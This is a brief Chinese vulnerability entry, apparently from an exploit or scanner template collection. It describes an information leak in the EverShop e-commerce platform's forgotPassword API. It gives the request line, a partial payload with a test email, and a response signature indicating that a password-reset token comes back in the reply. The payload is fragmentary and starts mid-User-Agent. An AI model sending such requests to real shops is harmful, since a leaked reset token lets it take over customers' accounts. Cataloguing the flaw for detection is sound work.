# EverShop开源电商平台forgotPassword存在信息泄露漏洞

EverShop ｜ 信息泄露 ｜ —
- **指纹**：`EverShop`
- **请求**：`POST /api/forgotPassword HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
"email": "test@example.com"
```
- **响应特征**：200 token